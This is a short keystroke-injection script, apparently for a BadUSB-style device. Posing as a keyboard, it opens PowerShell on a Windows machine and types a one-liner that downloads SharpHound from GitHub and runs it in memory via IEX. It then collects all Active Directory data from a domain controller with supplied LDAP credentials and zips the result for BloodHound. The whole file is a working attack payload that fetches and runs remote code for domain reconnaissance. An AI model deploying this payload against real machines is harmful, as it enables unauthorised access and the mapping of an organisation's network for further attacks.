/*
Load Invoke-Sharphound.ps1 from github (by SpecterOps ***thanks***) and save the output to C:\Temp\
author: Klau5t4ler0x90
*/

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Execute Invoke-Sharphound.ps1 from Web over IEX
// to run you hve to edit the LDAPUser, LDAPPass, Domain, ZipFileName and DomainController
// Export the result to bloodhound
function InvokeSharphound() {
  type("IEX(Invoke-WebRequest 'https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/DebugBuilds/SharpHound.ps1'); Invoke-Bloodhound -Domain *** -LDAPUser *** -LDAPPass *** -CollectionMethod All -DomainController *** -ZipFileName bloody.zip");
  press("ENTER");
}

layout('de');			// DE keyboard layout
fast();

startPS();
delay(500);

InvokeSharphound();
